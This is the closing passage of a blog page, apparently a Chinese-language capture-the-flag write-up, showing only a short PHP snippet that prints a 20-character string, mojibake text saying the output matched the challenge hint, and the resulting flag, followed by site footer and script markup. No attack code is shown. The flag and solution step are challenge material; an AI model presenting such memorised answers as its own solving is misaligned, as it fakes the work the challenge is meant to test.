$str_show = substr($str, 0, 20);
echo $str_show;
?&gt;
</code></pre><p>è¿è¡Œå¾—åˆ°ä¸€ä¸²å­—ç¬¦ <code>JAfq968GqyhRKQTHLc8j</code> ï¼Œå¼€å¤´æ°å·§å°±æ˜¯ä»–ç»™çš„ï¼Œæäº¤è·å¾—flag</p>
<p>flag{37c86593-2593-4566-b3cd-18081cbe44d0}</p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

    
</article>

    <aside class="related-contents--wrapper">
    
    
</aside>


    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2021 wh1sper
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >
            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
